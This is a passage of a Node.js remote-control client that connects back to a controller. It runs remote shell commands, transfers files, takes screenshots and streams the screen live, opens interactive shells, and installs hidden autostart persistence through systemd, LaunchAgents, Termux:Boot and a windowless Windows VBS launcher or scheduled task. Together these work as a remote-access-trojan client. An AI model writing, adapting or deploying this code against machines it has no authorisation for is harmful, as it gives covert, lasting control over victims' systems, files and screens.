      // sees EOF and reconnects.  Never let it escape as an unhandled error.
    } finally {
      if (key !== null && OUTGOING_TRANSFERS.get(key) === cancel) {
        OUTGOING_TRANSFERS.delete(key);
      }
    }
  })();
  task.catch(() => {});
  return task;
}

function decodeBase64Strict(value) {
  if (typeof value !== 'string') return null;
  if (value.length % 4 !== 0) return null;
  if (!/^[A-Za-z0-9+/]*={0,2}$/.test(value)) return null;
  return Buffer.from(value, 'base64');
}

// Client-side receive state for one streamed upload.
class IncomingTransfer {
  constructor(msg, currentDir) {
    this.kind = msg.kind === 'dir' ? 'dir' : 'file';
    this.entries = Array.isArray(msg.entries) ? msg.entries : [];
    this.totalFiles = Math.max(0, toInt(msg.total_files));
    this.totalBytes = Math.max(0, toInt(msg.total_bytes));
    this.received = 0;
    this.filesDone = 0;
    this.error = '';
    this.handle = null;
    this.tmp = null;
    this.target = null;
    this.expectedSize = 0;
    this.expectedHash = '';
    this.digest = null;
    this.mode = null;
    this.base = null;
    this.singleTarget = null;
    this.seenTargets = new Set();
    const root = safeTransferRel(msg.root || '');
    if (!root) {
      this.error = 'the controller sent an unsafe destination name';
      return;
    }
    try {
      if (this.kind === 'dir') {
        this.base = safeJoinUnder(currentDir, root);
        if (!isDirectory(this.base)) fs.mkdirSync(this.base);
        this.addEntries({ entries: this.entries });
      } else {
        this.singleTarget = safeJoinUnder(currentDir, root);
        if (isDirectory(this.singleTarget)) {
          this.error = 'destination is a folder: ' + this.singleTarget;
        }
      }
    } catch (e) {
      this.error = errorText(e);
    }
  }

  addEntries(msg) {
    if (this.error || this.kind !== 'dir' || !this.base) return;
    const entries = msg.entries;
    if (!Array.isArray(entries)) return;
    try {
      for (const entry of entries) {
        if (entry && typeof entry === 'object' && entry.kind === 'dir') {
          const rel = safeTransferRel(entry.path);
          if (rel) {
            const folder = safeJoinUnder(this.base, rel);
            if (!isDirectory(folder)) fs.mkdirSync(folder);
          }
        }
      }
    } catch (e) {
      this.error = errorText(e);
    }
  }

  startFile(msg) {
    if (this.error) return;
    const rel = safeTransferRel(msg.path);
    if (!rel) {
      this.error = 'the controller sent an unsafe file path';
      return;
    }
    this.expectedSize = Math.max(0, toInt(msg.size));
    if (!Number.isFinite(toInt(msg.size))) {
      this.error = 'invalid file size in transfer metadata';
      return;
    }
    this.expectedHash = typeof msg.hash === 'string' ? msg.hash : String(msg.hash || '');
    const rawMode = toInt(msg.mode);
    this.mode = msg.mode === undefined || msg.mode === null || !Number.isFinite(rawMode)
      ? null : (rawMode & 0o777);
    let target = null;
    try {
      if (this.kind === 'file') {
        target = this.singleTarget;
        if (target === null) throw new Error('no destination for this file');
      } else {
        target = safeJoinUnder(this.base, rel);
      }
      const identity = path.resolve(target).toLowerCase();
      if (this.seenTargets.has(identity)) {
        this.error = 'duplicate destination path: ' + rel;
        return;
      }
      this.seenTargets.add(identity);
      this.target = target;
      const parent = path.dirname(target) || process.cwd();
      this.tmp = tempFileNamed('.cmon-in-', parent);
      this.handle = fs.openSync(this.tmp, 'w');
      this.digest = crypto.createHash('sha256');
    } catch (e) {
      this.error = 'could not create ' + (target || rel) + ': ' + errorText(e);
      this.discardFile();
    }
  }

  addChunk(data) {
    if (this.error || this.handle === null) return;
    const raw = decodeBase64Strict(data);
    if (!raw) {
      this.error = 'invalid base64 in transfer';
      this.discardFile();
      return;
    }
    if (!raw.length || raw.length > MAX_TRANSFER_CHUNK) {
      this.error = 'invalid transfer chunk size';
      this.discardFile();
      return;
    }
    try {
      fs.writeSync(this.handle, raw, 0, raw.length);
      this.digest.update(raw);
      this.received += raw.length;
    } catch (e) {
      this.error = 'write failed: ' + errorText(e);
      this.discardFile();
    }
  }

  endFile() {
    if (this.handle === null) return;
    try { fs.fsyncSync(this.handle); } catch { /* ignore */ }
    try { fs.closeSync(this.handle); } catch { /* ignore */ }
    this.handle = null;
    const digest = this.digest ? this.digest.digest('hex') : '';
    let ok = !this.error;
    if (ok) {
      let actual = -1;
      try { actual = fs.statSync(this.tmp).size; } catch { actual = -1; }
      if (actual !== this.expectedSize) {
        ok = false;
        this.error = 'size mismatch for ' + this.target + ' (expected '
          + this.expectedSize + ', got ' + actual + ')';
      }
      if (ok && this.expectedHash && digest !== this.expectedHash) {
        ok = false;
        this.error = 'checksum mismatch for ' + this.target;
      }
    }
    if (ok) {
      if (this.mode !== null && !IS_WINDOWS) {
        try { fs.chmodSync(this.tmp, this.mode); } catch { /* a FAT/network mount may refuse modes */ }
      }
      try {
        fs.renameSync(this.tmp, this.target);
        this.tmp = null;
        this.filesDone += 1;
      } catch (e) {
        ok = false;
        this.error = 'could not save ' + this.target + ': ' + errorText(e);
      }
    }
    if (!ok) this.discardFile();
    this.expectedSize = 0;
    this.expectedHash = '';
    this.digest = null;
  }

  abort(msg) {
    if (!this.error) {
      this.error = String((msg && msg.reason) || 'the controller aborted the transfer');
    }
    this.discardFile();
  }

  discardFile() {
    if (this.handle !== null) {
      try { fs.closeSync(this.handle); } catch { /* ignore */ }
      this.handle = null;
    }
    if (this.tmp) {
      try { fs.unlinkSync(this.tmp); } catch { /* ignore */ }
      this.tmp = null;
    }
    this.digest = null;
  }

  finish() {
    if (this.handle !== null && !this.error) {
      this.error = 'the transfer ended in the middle of a file';
    }
    this.discardFile();
    if (!this.error) {
      if (this.kind === 'file' && this.filesDone !== 1) {
        this.error = 'the file was not completed';
      } else if (this.kind === 'dir' && this.totalFiles && this.filesDone !== this.totalFiles) {
        this.error = 'upload incomplete (' + this.filesDone + ' of ' + this.totalFiles + ' files)';
      }
    }
    if (this.error) return ['error', 'upload failed: ' + this.error];
    const where = this.kind === 'dir' ? this.base : this.singleTarget;
    return ['output', 'Saved to ' + where + ' (' + this.filesDone + ' file'
      + (this.filesDone === 1 ? '' : 's') + ', ' + this.received + ' bytes)'];
  }
}

function toInt(value) {
  if (value === undefined || value === null || value === '') return 0;
  const number = Number(value);
  return Number.isFinite(number) ? Math.trunc(number) : NaN;
}

function tempFileNamed(prefix, dir) {
  for (let attempt = 0; attempt < 100; attempt++) {
    const candidate = path.join(dir, prefix + crypto.randomBytes(8).toString('hex'));
    if (!anyExists(candidate)) return candidate;
  }
  throw new Error('could not create a temporary file in ' + dir);
}

function incomingBegin(msg, reqId, currentDir) {
  const key = incomingKey(reqId);
  if (key === null) return;
  const old = INCOMING_TRANSFERS.get(key);
  if (old) {
    INCOMING_TRANSFERS.delete(key);
    old.discardFile();
  }
  INCOMING_TRANSFERS.set(key, new IncomingTransfer(msg, currentDir));
}

function incomingDrop(reqId) {
  const key = incomingKey(reqId);
  if (key === null) return null;
  const state = INCOMING_TRANSFERS.get(key);
  if (state) INCOMING_TRANSFERS.delete(key);
  return state || null;
}

// Feed one upload-protocol message to its receive state.  Called by both the
// idle read loop and run_command's control-message loop, so a long foreground
// command cannot make a background upload's chunks pile up in the deferred
// queue.
function handleTransferMessage(conn, msg, reqId, currentDir) {
  const mtype = msg.type;
  if (mtype === 'transfer_begin') {
    incomingBegin(msg, reqId, currentDir);
    return;
  }
  const key = incomingKey(reqId);
  const state = key !== null ? INCOMING_TRANSFERS.get(key) : null;
  if (!state) return;
  if (mtype === 'transfer_entries') state.addEntries(msg);
  else if (mtype === 'transfer_file_begin') {
    state.endFile();            // a previous file was truncated
    state.startFile(msg);
  } else if (mtype === 'transfer_chunk') state.addChunk(msg.data);
  else if (mtype === 'transfer_file_end') state.endFile();
  else if (mtype === 'transfer_abort') state.abort(msg);
  else if (mtype === 'transfer_end') {
    const dropped = incomingDrop(reqId);
    if (dropped) {
      const [rtype, text] = dropped.finish();
      sendMsg(conn, { type: rtype, id: reqId, data: text }).catch(() => {});
    }
  }
}

// Answer one 'download' request.  The current controller always sets
// ``stream``: files of every size and whole folders use the streamed
// protocol.  A request from an older controller without that flag keeps the
// old single-message reply only when the file is small enough.
async function serveDownloadRequest(conn, msg, reqId, currentDir) {
  const rawPath = msg.path === undefined ? '' : msg.path;
  if (typeof rawPath !== 'string') {
    await sendMsg(conn, { type: 'error', id: reqId, data: 'download: path must be text' });
    return;
  }
  const expanded = expandUser(rawPath);
  const realPath = path.isAbsolute(expanded) ? expanded : path.join(currentDir, expanded);
  try {
    const info = fs.statSync(realPath);
    const isDir = info.isDirectory();
    const isFile = info.isFile();
    const limit = Math.floor((MAX_MSG * 3) / 4);
    if (isDir || msg.stream || !isFile || info.size > limit) {
      if (!isDir && !isFile) throw new Error('not a regular file or folder');
      startDownloadTransfer(conn, reqId, realPath);
      return;
    }
    const raw = fs.readFileSync(realPath);
    if (raw.length > limit) {
      startDownloadTransfer(conn, reqId, realPath);
      return;
    }
    await sendMsg(conn, {
      type: 'file', id: reqId, name: path.basename(realPath),
      data: raw.toString('base64'),
    });
  } catch (e) {
    try {
      await sendMsg(conn, { type: 'error', id: reqId, data: 'download failed: ' + errorText(e) });
    } catch { /* the link is gone */ }
  }
}

// ---------------------------------------------------------------------------
// Session loop and dispatcher (mirrors main()'s inner loop)
// ---------------------------------------------------------------------------
async function serveSession(conn, target) {
  let stop = false;
  DEFERRED.length = 0;
  CANCELED.clear();
  for (;;) {
    let msg;
    if (DEFERRED.length) {
      msg = DEFERRED.shift();
    } else {
      msg = await recvMsg(conn);
      if (msg === null) break;
    }

    const mtype = msg.type;
    let reqId = msg.id === undefined ? null : msg.id;
    if (reqId !== null && !validReqId(reqId)) reqId = null;

    if (!CANCEL_EXEMPT.has(mtype) && isCanceled(reqId)) {
      const why = forgetCanceled(reqId) || 'Ctrl+Z';
      await sendMsg(conn, { type: 'output', id: reqId, data: '[client] canceled (' + why + ')' });
      continue;
    }

    if (mtype === 'exit') {
      await stopStream(0.5);
      stopShell();
      try {
        await sendMsg(conn, { type: 'output', id: reqId, data: '[client] shutting down' });
      } catch { /* ignore */ }
      stop = true;
      break;
    }

    if (mtype === 'cmd') {
      const command = msg.data === undefined ? '' : msg.data;
      if (typeof command !== 'string') {
        await sendMsg(conn, { type: 'error', id: reqId, data: 'cmd: data must be text' });
        continue;
      }
      if (!command.trim()) continue;

      const cdResult = changeDir(command, target.currentDir);
      if (cdResult !== null) {
        target.currentDir = cdResult.dir;
        await sendMsg(conn, {
          type: 'output', id: reqId,
          data: cdResult.output !== null ? cdResult.output : '[no output]',
        });
        continue;
      }

      let text;
      let stopRequested;
      let exitCode;
      try {
        const result = await runCommand(conn, command, target.currentDir, reqId);
        text = result.text; stopRequested = result.stop; exitCode = result.exitCode;
      } catch (e) {
        text = 'command failed: ' + errorText(e);
        stopRequested = false;
        exitCode = 127;
      }
      if (stopRequested) stop = true;
      if (!text) text = '[no output]';
      const reply = { type: 'output', id: reqId, data: text };
      if (exitCode !== null && exitCode !== undefined) reply.exit_code = exitCode;
      try {
        await sendMsg(conn, reply);
      } catch (e) {
        if (!stop) throw e;
      }
      if (stopRequested) break;
      continue;
    }

    if (mtype === 'upex') {
      let result;
      try {
        result = await runUpex(conn, msg, target.currentDir, reqId);
      } catch (e) {
        result = { text: 'upex failed: ' + errorText(e), stop: false, exitCode: 1 };
      }
      if (result.stop) stop = true;
      const text = result.text ? result.text : '[no output]';
      const reply = { type: 'output', id: reqId, data: text };
      if (result.exitCode !== null && result.exitCode !== undefined) reply.exit_code = result.exitCode;
      try {
        await sendMsg(conn, reply);
      } catch (e) {
        if (!stop) throw e;
      }
      if (result.stop) break;
      continue;
    }

    if (mtype === 'cmd_kill' || mtype === 'cancel') {
      if (mtype === 'cancel') {
        const key = incomingKey(reqId);
        const state = key != null ? INCOMING_TRANSFERS.get(key) : null;
        if (state) state.abort({ reason: msg.why || 'canceled by the controller' });
        outgoingCancel(reqId);
      }
      continue;
    }

    if (mtype === 'download') {
      await serveDownloadRequest(conn, msg, reqId, target.currentDir);
      continue;
    }

    if (typeof mtype === 'string' && mtype.startsWith('transfer_')) {
      handleTransferMessage(conn, msg, reqId, target.currentDir);
      continue;
    }

    if (mtype === 'upload') {
      await handleLegacyUpload(conn, msg, reqId, target.currentDir);
      continue;
    }

    if (mtype === 'screenshot') {
      await takeScreenshot(conn, reqId);
      continue;
    }

    if (mtype === 'persist') {
      let text;
      try { text = installAutostart(target.displayAddress, target.port); }
      catch (e) { text = 'persist failed: ' + errorText(e); }
      await sendMsg(conn, { type: 'output', id: reqId, data: text });
      continue;
    }

    if (mtype === 'unpersist') {
      let text;
      try { text = removeAutostart(); }
      catch (e) { text = 'unpersist failed: ' + errorText(e); }
      await sendMsg(conn, { type: 'output', id: reqId, data: text });
      continue;
    }

    if (mtype === 'screenshare') {
      // One share at a time: stop the previous one, then stream in the
      // background so commands keep working while the screen is live.
      await stopStream();
      startStreamWorker(conn, msg.fps, reqId);
      log('[+] Screen share started (' + (msg.fps || 'max') + ' fps)');
      continue;
    }

    if (mtype === 'screenshare_stop') {
      if (await stopStream()) log('[+] Screen share stopped.');
      else await sendMsg(conn, { type: 'output', id: reqId, data: '[client] no screen share is running' });
      continue;
    }

    if (mtype === 'shell') {
      const token = msg.token;
      if (!token) {
        await sendMsg(conn, { type: 'error', id: reqId, data: 'shell: controller sent no token; update both scripts together' });
        continue;
      }
      startInteractiveShell(conn, target.host, target.port, target.scheme, token, reqId);
      continue;
    }

    await sendMsg(conn, { type: 'error', id: reqId, data: 'unknown message type: ' + String(mtype) });
  }
  return stop;
}

async function handleLegacyUpload(conn, msg, reqId, currentDir) {
  let rawName = String(msg.name || 'uploaded.bin').replace(/\\/g, '/');
  let name = path.basename(rawName).replace(/\x00/g, '_');
  if (name === '' || name === '.' || name === '..') name = 'uploaded.bin';
  if (IS_WINDOWS) {
    const stem = name.split('.')[0].replace(/[ .]+$/, '').toUpperCase();
    const reserved = new Set(['CON', 'PRN', 'AUX', 'NUL',
      ...Array.from({ length: 9 }, (_, i) => 'COM' + (i + 1)),
      ...Array.from({ length: 9 }, (_, i) => 'LPT' + (i + 1))]);
    if (reserved.has(stem) || name.includes(':')) name = '_' + name.replace(/:/g, '_');
    name = name.replace(/[ .]+$/, '') || 'uploaded.bin';
  }
  const dest = path.join(currentDir, name);
  try {
    const encoded = msg.data === undefined ? '' : msg.data;
    if (typeof encoded !== 'string') throw new Error('upload data is not text');
    const decodedSize = Math.floor((encoded.length * 3) / 4);
    if (decodedSize > MAX_MSG) throw new Error('legacy upload exceeds one protocol message; use the streamed transfer');
    const data = Buffer.from(encoded, 'base64');
    if (data.length > MAX_MSG) throw new Error('legacy upload exceeds one protocol message; use the streamed transfer');
    const tmpPath = path.join(currentDir, '.upload-' + crypto.randomBytes(8).toString('hex'));
    try {
      fs.writeFileSync(tmpPath, data);
      fs.renameSync(tmpPath, dest);
    } catch (e) {
      try { fs.unlinkSync(tmpPath); } catch { /* ignore */ }
      throw e;
    }
    await sendMsg(conn, { type: 'output', id: reqId, data: 'Saved to ' + dest + ' (' + data.length + ' bytes)' });
  } catch (e) {
    await sendMsg(conn, { type: 'error', id: reqId, data: 'upload failed: ' + errorText(e) });
  }
}

// ---------------------------------------------------------------------------
// Persistence: the --persist / --remove-persist installers
//
// A direct port of the persistence section of client.py / Autostart.cs:
// systemd user/system units on Linux, LaunchAgents on macOS, Termux:Boot on
// Android, and a hidden VBS launcher plus Scheduled Task/registry fallback on
// Windows.  Node has no registry API, so the registry fallback uses reg.exe.
// ---------------------------------------------------------------------------
const AUTOSTART_SERVICE = 'autorun-' + AUTORUN_NAME + '.service';
const AUTOSTART_TASK = 'AutoRun_' + AUTORUN_NAME;
let AUTOSTART_REPORT = null;

function report(line) {
  if (AUTOSTART_REPORT) AUTOSTART_REPORT.push(line);
}

function homeDir() {
  try { return os.homedir(); } catch { return process.env.HOME || process.cwd(); }
}

function currentUid() {
  return typeof process.getuid === 'function' ? process.getuid() : 0;
}

// How this program invokes itself: node <absolute path to client.js>.
function selfCommandParts() {
  return [process.execPath, SCRIPT_PATH];
}

function quotePosix(value) {
  return "'" + String(value).replace(/'/g, "'\\''") + "'";
}

function quoteWindows(value) {
  value = String(value);
  if (value.length && !/[ \t\n\v"]/.test(value)) return value;
  let out = '"';
  let backslashes = 0;
  for (const ch of value) {
    if (ch === '\\') { backslashes += 1; continue; }
    if (ch === '"') {
      out += '\\'.repeat(backslashes * 2 + 1) + '"';
      backslashes = 0;
      continue;
    }
    out += '\\'.repeat(backslashes) + ch;
    backslashes = 0;
  }
  out += '\\'.repeat(backslashes * 2) + '"';
  return out;
}

function runCaptureSync(argv, timeoutMs = 5000) {
  try {
    const result = require('child_process').spawnSync(argv[0], argv.slice(1), {
      windowsHide: true, timeout: timeoutMs, env: process.env,
      maxBuffer: 4 * 1024 * 1024,
    });
    if (result.error) return { code: -1, output: '' };
    return {
      code: result.status === null ? -1 : result.status,
      output: (result.stdout || Buffer.alloc(0)).toString('utf8'),
    };
  } catch { return { code: -1, output: '' }; }
}

function userManagerRunning() {
  try { return fs.existsSync('/run/user/' + currentUid() + '/systemd'); } catch { return false; }
}

// Detached stop/removal helper: survives this process exiting so the
// unpersist/persist reply is never lost when the service is the process
// serving the request (the client.py _run_later equivalent).
function runLater(argv) {
  if (IS_WINDOWS) return;
  try {
    const child = spawnChild('/bin/sh',
      ['-c', 'sleep 3; exec "$@" </dev/null >/dev/null 2>&1', 'sh', ...argv],
      { detached: true, stdio: 'ignore' });
    child.unref();
  } catch { /* best effort */ }
}

function systemdQuote(word, command) {
  word = String(word).replace(/%/g, '%%');
  if (command) word = word.replace(/\$/g, '$$');
  if (/[ \t"'\\]/.test(word)) {
    word = '"' + word.replace(/\\/g, '\\\\').replace(/"/g, '\\"') + '"';
  }
  return word;
}

function systemdEnvValue(value) {
  value = String(value).replace(/\r/g, ' ').replace(/\n/g, ' ').replace(/%/g, '%%');
  if (/[ \t"'\\]/.test(value)) {
    value = '"' + value.replace(/\\/g, '\\\\').replace(/"/g, '\\"') + '"';
  }
  return value;
}

function systemdUserEnvironment() {
  const lines = [];
  for (const name of ['DISPLAY', 'WAYLAND_DISPLAY', 'XAUTHORITY', 'XDG_CURRENT_DESKTOP']) {
    const value = process.env[name];
    if (value) lines.push('Environment=' + name + '=' + systemdEnvValue(value));
  }
  return lines.length ? lines.join('\n') + '\n' : '';
}

function serviceBody(execCmd, silent, logFile, after, wanted, userLine, envLines = '') {
  let output;
  if (logFile) output = 'append:' + path.resolve(logFile).replace(/%/g, '%%');
  else if (silent) output = 'null';
  else output = 'journal';
  const afterLine = after == null ? '' : 'After=' + after + '\n';
  const dir = path.dirname(SCRIPT_PATH).replace(/%/g, '%%');
  return '[Unit]\n'
    + 'Description=Auto-run for ' + AUTORUN_NAME.replace(/%/g, '%%') + '\n'
    + afterLine
    + '\n'
    + '[Service]\n'
    + 'Type=simple\n'
    + envLines
    + userLine
    + 'ExecStart=' + execCmd + '\n'
    + 'WorkingDirectory=' + dir + '\n'
    + 'Restart=on-failure\n'
    + 'RestartSec=3\n'
    + 'StandardInput=null\n'
    + 'StandardOutput=' + output + '\n'
    + 'StandardError=' + output + '\n'
    + '\n'
    + '[Install]\n'
    + 'WantedBy=' + wanted + '\n';
}

function setupLinux(ip, port, silent, logFile) {
  if (!which('systemctl')) {
    report('[-] systemd is not available on this system.');
    return false;
  }
  const parts = selfCommandParts().concat([String(ip), String(port)]);
  const execCmd = parts.map((part) => systemdQuote(part, true)).join(' ');

  if (isOmarchy() || userManagerRunning()) {
    const svcDir = path.join(homeDir(), '.config', 'systemd', 'user');
    try { fs.mkdirSync(svcDir, { recursive: true }); }
    catch (e) { report('[-] Cannot create ' + svcDir + ': ' + errorText(e)); return false; }
    const graphical = isOmarchy()
      || runQuiet(['systemctl', '--user', 'is-active', '--quiet', 'graphical-session.target']);
    const after = graphical ? 'graphical-session.target' : null;
    const wanted = graphical ? 'graphical-session.target' : 'default.target';
    const svcPath = path.join(svcDir, AUTOSTART_SERVICE);
    try {
      fs.writeFileSync(svcPath,
        serviceBody(execCmd, silent, logFile, after, wanted, '', systemdUserEnvironment()));
    } catch (e) {
      report('[-] Cannot write service: ' + errorText(e));
      return false;
    }
    runQuiet(['systemctl', '--user', 'daemon-reload']);
    if (!runQuiet(['systemctl', '--user', 'enable', '--now', AUTOSTART_SERVICE])) {
      report('[-] systemctl --user enable failed.');
      return false;
    }
    report('[+] User service: ' + svcPath);
    if (graphical) {
      report('[+] Starts with your desktop session after reboot, no window.');
    } else {
      const linger = runQuiet(['loginctl', 'enable-linger', String(currentUid())]);
      if (linger) report('[+] Starts at boot (linger enabled), no login needed.');
      else {
        report('[+] Starts when you log in after a reboot.');
        report('[!] To start at boot with nobody logged in (servers):');
        const user = process.env.USER || process.env.LOGNAME || String(currentUid());
        report('    sudo loginctl enable-linger ' + user);
      }
    }
    return true;
  }

  if (currentUid() !== 0) {
    report('[-] Need root for a system service: re-run with sudo.');
    return false;
  }
  const runUser = process.env.SUDO_USER || 'root';
  const userLine = runUser === 'root' ? '' : 'User=' + runUser + '\n';
  const systemPath = '/etc/systemd/system/' + AUTOSTART_SERVICE;
  try {
    fs.writeFileSync(systemPath,
      serviceBody(execCmd, silent, logFile, 'network.target', 'multi-user.target', userLine));
  } catch (e) {
    report('[-] Cannot write service: ' + errorText(e));
    return false;
  }
  runQuiet(['systemctl', 'daemon-reload']);
  if (!runQuiet(['systemctl', 'enable', '--now', AUTOSTART_SERVICE])) {
    report('[-] systemctl enable failed.');
    return false;
  }
  report('[+] System service: ' + systemPath);
  report('[+] Runs at boot with no terminal window.');
  return true;
}

function macosLabel() {
  const safe = String(AUTORUN_NAME).replace(/[^A-Za-z0-9.-]/g, '-');
  return 'com.autorun.' + (safe.length ? safe : 'client');
}

function macosPlistPath() {
  return path.join(homeDir(), 'Library', 'LaunchAgents', macosLabel() + '.plist');
}

function macosRunningUnderLabel(label) {
  if (process.env.XPC_SERVICE_NAME === label) return true;
  try {
    const captured = runCaptureSync(['launchctl', 'print',
      'gui/' + currentUid() + '/' + label]);
    if (captured.code !== 0) return false;
    for (const raw of captured.output.split('\n')) {
      const line = raw.trim();
      if (!line.startsWith('pid =')) continue;
      const value = line.split('=')[1];
      const pid = parseInt(String(value || '').trim(), 10);
      if (!Number.isFinite(pid)) return false;
      return pid === process.pid;
    }
    return false;
  } catch {
    return typeof process.ppid === 'number' && process.ppid === 1;
  }
}

function xmlEscape(value) {
  return String(value)
    .replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;').replace(/'/g, '&apos;');
}

function macosPlistText(ip, port, logFile) {
  const logPath = logFile ? path.resolve(logFile) : '/dev/null';
  const args = selfCommandParts().concat([String(ip), String(port)]);
  const lines = [
    '<?xml version="1.0" encoding="UTF-8"?>',
    '<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">',
    '<plist version="1.0">',
    '<dict>',
    '  <key>Label</key>',
    '  <string>' + xmlEscape(macosLabel()) + '</string>',
    '  <key>ProgramArguments</key>',
    '  <array>',
  ];
  for (const arg of args) lines.push('    <string>' + xmlEscape(arg) + '</string>');
  lines.push(
    '  </array>',
    '  <key>RunAtLoad</key>',
    '  <true/>',
    '  <key>KeepAlive</key>',
    '  <dict>',
    '    <key>SuccessfulExit</key>',
    '    <false/>',
    '  </dict>',
    '  <key>WorkingDirectory</key>',
    '  <string>' + xmlEscape(path.dirname(SCRIPT_PATH)) + '</string>',
    '  <key>ProcessType</key>',
    '  <string>Interactive</string>',
    '  <key>StandardOutPath</key>',
    '  <string>' + xmlEscape(logPath) + '</string>',
    '  <key>StandardErrorPath</key>',
    '  <string>' + xmlEscape(logPath) + '</string>',
    '</dict>',
    '</plist>',
    '');
  return lines.join('\n');
}

function setupMacos(ip, port, silent, logFile) {
  const label = macosLabel();
  const plistPath = macosPlistPath();
  try {
    fs.mkdirSync(path.dirname(plistPath), { recursive: true });
    fs.writeFileSync(plistPath, macosPlistText(ip, port, logFile));
  } catch (e) {
    report('[-] Cannot write LaunchAgent: ' + errorText(e));
    return false;
  }
  const uid = currentUid();
  const service = 'gui/' + uid + '/' + label;
  if (macosRunningUnderLabel(label)) {
    report('[i] This client is the running LaunchAgent; the updated plist');
    report('    will be used at the next login.');
  } else {
    runQuiet(['launchctl', 'bootout', service]);
    let loaded = runQuiet(['launchctl', 'bootstrap', 'gui/' + uid, plistPath]);
    if (!loaded) loaded = runQuiet(['launchctl', 'load', '-w', plistPath]);
    if (!loaded) {
      report('[-] launchctl could not load the LaunchAgent.');
      report('    Try: launchctl bootstrap gui/' + uid + ' "' + plistPath + '"');
      return false;
    }
    runQuiet(['launchctl', 'kickstart', '-k', service]);
  }
  report('[+] LaunchAgent: ' + plistPath);
  report('[+] Starts automatically at login; no terminal window.');
  report('[i] The first screenshot may ask for Screen & System Audio Recording');
  report('    permission: System Settings > Privacy & Security (older macOS calls');
  report('    the pane Screen Recording).');
  if (!silent) report('[i] macOS LaunchAgents always run in the background (no window).');
  return true;
}

function androidBootPath() {
  return path.join(homeDir(), '.termux', 'boot', 'autorun-' + AUTORUN_NAME + '.sh');
}

function androidBootScript(ip, port, logFile) {
  const prefix = process.env.PREFIX || '/data/data/com.termux/files/usr';
  const shell = path.join(prefix, 'bin', 'sh');
  const logPath = logFile ? path.resolve(logFile)
    : path.join(homeDir(), '.termux', AUTORUN_NAME + '-client.log');
  const command = selfCommandParts().map(quotePosix).join(' ');
  return '#!' + shell + '\n'
    + '# Generated by client.js --persist (Termux:Boot).\n'
    + 'cd ' + quotePosix(path.dirname(SCRIPT_PATH)) + ' || cd "$HOME"\n'
    + quotePosix(path.join(prefix, 'bin', 'termux-wake-lock')) + ' >/dev/null 2>&1 || true\n'
    + 'exec ' + command + ' ' + quotePosix(String(ip)) + ' ' + parseInt(port, 10)
    + ' >> ' + quotePosix(logPath) + ' 2>&1\n';
}

function setupAndroid(ip, port, silent, logFile) {
  const bootPath = androidBootPath();
  try {
    fs.mkdirSync(path.dirname(bootPath), { recursive: true });
    fs.writeFileSync(bootPath, androidBootScript(ip, port, logFile));
    try { fs.chmodSync(bootPath, 0o700); } catch { /* not fatal */ }
  } catch (e) {
    report('[-] Cannot write boot script: ' + errorText(e));
    return false;
  }
  report('[+] Boot script: ' + bootPath);
  report('[+] Install Termux:Boot (F-Droid or GitHub), open it once, then reboot.');
  report('[+] Set Termux to Unrestricted: Settings > Apps > Termux > Battery.');
  report('[i] Android 12+: if Android kills it, disable phantom-process trimming');
  report('    (Termux wiki: "Processes are being killed"); the boot script takes');
  report('    a wake lock, and a running client holds one too.');
  report('[i] Android 17+: allow Nearby devices / local network for Termux,');
  report('    otherwise LAN connections to the controller are blocked.');
  report('[i] Screen capture needs root (su + screencap); shell and files work without.');
  report('[i] For shared storage (e.g. /sdcard/Download): run termux-setup-storage');
  report('    once, and allow "All files access" for Termux in Android settings.');
  report('[i] Prefer the F-Droid/GitHub Termux build; the Play Store build is limited.');
  if (!silent) report('[i] Termux:Boot always starts the client in the background.');
  return true;
}

function androidWakeLock(enable) {
  if (!isAndroid()) return;
  const prefix = process.env.PREFIX || '/data/data/com.termux/files/usr';
  const exe = path.join(prefix, 'bin', enable ? 'termux-wake-lock' : 'termux-wake-unlock');
  try {
    if (!fs.existsSync(exe)) return;
    const child = spawnChild(exe, [], { detached: true, stdio: 'ignore' });
    child.unref();
  } catch { /* best effort - Android may deny the helper */ }
}

function autoRunnerDir() {
  const local = process.env.LOCALAPPDATA || path.join(homeDir(), 'AppData', 'Local');
  return path.join(local || os.tmpdir(), 'AutoRunner');
}

function vbsPath() {
  return path.join(autoRunnerDir(), 'AutoRun_' + AUTORUN_NAME + '.vbs');
}

function makeVbs(args, workingDir, logFile) {
  const baseDir = autoRunnerDir();
  fs.mkdirSync(baseDir, { recursive: true });
  const vbs = vbsPath();
  const workdir = workingDir || process.cwd();
  let inner = selfCommandParts().map(quoteWindows).join(' ');
  if (args) inner += ' ' + args;
  if (logFile) {
    const logPath = path.resolve(logFile).replace(/%/g, '%%');
    inner = 'cmd /c "' + inner + ' >> "' + logPath + '" 2>&1"';
  }
  const escaped = inner.replace(/"/g, '""');
  const content = 'Set WshShell = CreateObject("WScript.Shell")\r\n'
    + 'WshShell.CurrentDirectory = "' + workdir.replace(/"/g, '""') + '"\r\n'
    + 'WshShell.Run "' + escaped + '", 0, False\r\n';
  // VBScript files are read as UTF-16 when they start with a BOM.
  fs.writeFileSync(vbs, Buffer.concat([Buffer.from([0xff, 0xfe]), Buffer.from(content, 'utf16le')]));
  return vbs;
}

function windowsCommand(ip, port, silent, logFile) {
  const args = quoteWindows(String(ip)) + ' ' + parseInt(port, 10);
  const workdir = path.dirname(SCRIPT_PATH);
  if (silent) {
    const vbs = makeVbs(args, workdir, logFile);
    return { execute: 'wscript.exe', arguments: quoteWindows(vbs), workingDir: workdir };
  }
  const parts = selfCommandParts();
  const execute = parts[0];
  let execArgs = parts.slice(1).map(quoteWindows).join(' ');
  if (execArgs.length) execArgs += ' ';
  execArgs += args;
  if (logFile) {
    const logPath = path.resolve(logFile);
    return {
      execute: 'cmd.exe',
      arguments: '/c "' + quoteWindows(execute) + ' ' + execArgs + ' >> "' + logPath + '" 2>&1"',
      workingDir: workdir,
    };
  }
  return { execute, arguments: execArgs, workingDir: workdir };
}

function registerTaskPowershell(taskName, execute, args, workingDir) {
  let action = args.length
    ? '$action = New-ScheduledTaskAction -Execute $exe -Argument $arg'
    : '$action = New-ScheduledTaskAction -Execute $exe';
  if (workingDir) action += " -WorkingDirectory '" + workingDir.replace(/'/g, "''") + "'";
  const ps = [
    "$ErrorActionPreference = 'Stop'",
    "$exe = '" + execute.replace(/'/g, "''") + "'",
    "$arg = '" + args.replace(/'/g, "''") + "'",
    action,
    '$trigger = New-ScheduledTaskTrigger -AtLogOn -User $env:USERNAME',
